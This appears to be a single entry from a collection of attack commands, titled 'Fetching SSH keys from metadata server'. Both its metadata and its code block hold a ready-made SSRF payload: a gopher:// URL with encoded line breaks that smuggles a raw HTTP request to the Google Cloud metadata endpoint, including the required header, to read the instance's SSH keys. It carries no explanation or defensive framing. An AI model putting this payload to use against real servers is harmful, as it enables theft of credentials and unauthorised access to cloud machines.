---
id: 87dedfc4-fa03-46e0-b0bf-73f419e8c4a2
name: Fetching SSH keys from metadata server
type: command
executor: bash
data: gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
output: null
created_at: '2023-04-06T03:56:38.367246+00:00'
updated_at: '2023-04-10T20:24:09.048643+00:00'
---

# Fetching SSH keys from metadata server

```bash
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```


